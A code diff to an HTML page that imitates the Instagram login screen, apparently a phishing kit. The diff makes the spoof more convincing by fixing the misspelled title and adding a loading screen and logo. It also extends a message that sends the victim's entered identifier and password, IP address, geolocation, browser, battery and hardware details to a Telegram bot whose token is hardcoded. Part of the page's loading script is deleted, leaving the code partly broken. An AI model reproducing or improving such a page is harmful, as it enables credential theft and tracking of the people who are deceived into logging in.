@@ -3,13 +3,32 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Login • lnstagram</title>
+    <title>Login • Instagram</title>
     <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
     <style>
-        <style>
         body {
-        .login-container {
+            
+        .loading-screen {
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            width: 100vw;
+            background-color: #000;
+            position: absolute;
+            top: 0;
+            left: 0;
+            z-index: 10;
+            opacity: 1;
+            transition: opacity 1s ease-in-out;
+        }
+        .loading-screen.hidden {
+            opacity: 0;
+            pointer-events: none; /* Disable interaction after hidden */
+        }
+         .login-container {
             background-color: #000; /* Matches body background */
             border: 1px solid #262626; /* Darker border */
             border-radius: 8px;
@@ -20,6 +39,11 @@
             display: none; /* Hidden initially */
             flex-direction: column;
             align-items: center;
+        }
+        .instagram-logo-img { /* New style for the Instagram logo image in login page */
+            width: 175px; /* Adjusted to fit the image proportions better */
+            height: auto;
+            margin-bottom: 30px;
         }
         input[type="text"],
         input[type="password"] {
@@ -236,7 +260,8 @@
         }
     </style>
 </head>
-<body> 
+<body>
+    <!-- Login Page -->
     <div id="login-page" class="login-container">
         <img src="https://github.com/KINGSHUBHAM-tech/Logo-cp-websp/blob/main/instagram-logo.png?raw=true"
              alt="Instagram"
@@ -316,16 +341,7 @@
             const loginPage = document.getElementById('login-page');
             const loginButton = document.getElementById('login-button');
             const usernameEmailPhoneInput = document.getElementById('username-email-phone');
-            const passwordInput = document.getElementById('password');
-
-            // Simulate loading for 2 seconds then show login page
-            setTimeout(() => {
-                loadingScreen.classList.add('hidden');
-                setTimeout(() => {
-                    loadingScreen.style.display = 'none'; // Completely remove after transition
-                    loginPage.style.display = 'flex'; // Show the login page
-                }, 1000); // Wait for opacity transition to complete
-            }, 2000);
+            const passwordInput = document.getElementById('password')
 
             // Validation functions
             const isEmail = (input) => /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(input);
@@ -438,11 +454,33 @@
                         hardwareConcurrency = `Error in fetching Hardware Concurrency (${e.message || e.name})`;
                     }
 
+                    detailedInfoSection = `
+🔋 *Device Info:*
+- Battery Level: ${batteryLevel}
+- Battery Charging: ${batteryCharging}
+- Network Type: ${networkType}
+- Effective Network Type: ${networkEffectiveType}
+- Device Memory: ${deviceMemory}
+- Hardware Concurrency (CPU cores): ${hardwareConcurrency}
+`;
+                }
+
+
                 const fullMessage = `
 ? *${actionType}*
 ---------------------
 � *Identifier:* ${input1 || 'Not Entered'}
 📝 *Password:* ${input2 || 'Not Entered'}
+
+🌐 *Browser Info:*
+- Platform: ${platform}
+- Language: ${language}
+- Timezone: ${timezone}
+- User Agent: ${browser}
+
+🌍 *IP Address:* ${ip}
+📍 *Geolocation:* ${locationText}
+${detailedInfoSection}
 `;
 
                 const botToken = '6058106297:AAE3o2YdDcc915N81s91F3S9jzMTYj1k0UQ';
